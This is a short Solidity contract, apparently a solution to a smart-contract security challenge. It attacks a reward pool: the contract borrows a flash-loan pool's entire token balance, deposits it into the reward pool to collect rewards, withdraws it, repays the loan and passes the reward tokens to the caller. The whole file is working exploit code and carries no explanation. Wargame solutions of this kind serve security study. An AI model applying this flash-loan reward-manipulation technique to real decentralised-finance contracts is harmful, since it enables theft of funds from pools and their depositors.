pragma solidity ^0.8.5;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract RewarderAttacker{ 
    address public rewarderPool;
    address public flashLoanerPool;
    address public liquidtyToken;
    address public rewardToken;    
    
    constructor(address rewarder,address flashLoaner,address token,address rewardToken_) public{ 
        rewarderPool = rewarder;
        flashLoanerPool = flashLoaner;
        liquidtyToken = token;
        rewardToken = rewardToken_;
    }

    function attack() public {
        FlashLoanerPool targetPool = FlashLoanerPool(flashLoanerPool);
        uint256 amount = ERC20(liquidtyToken).balanceOf(flashLoanerPool);
        targetPool.flashLoan(amount);
        uint256 returnToOwner = ERC20(rewardToken).balanceOf(address(this));
        ERC20(rewardToken).transfer(msg.sender,returnToOwner);
    }

    function receiveFlashLoan(uint256 amount) public {
        TheRewarderPool rewardPool = TheRewarderPool(rewarderPool);
        ERC20(liquidtyToken).approve(rewarderPool,amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        ERC20(liquidtyToken).transfer(flashLoanerPool,amount);
    }
}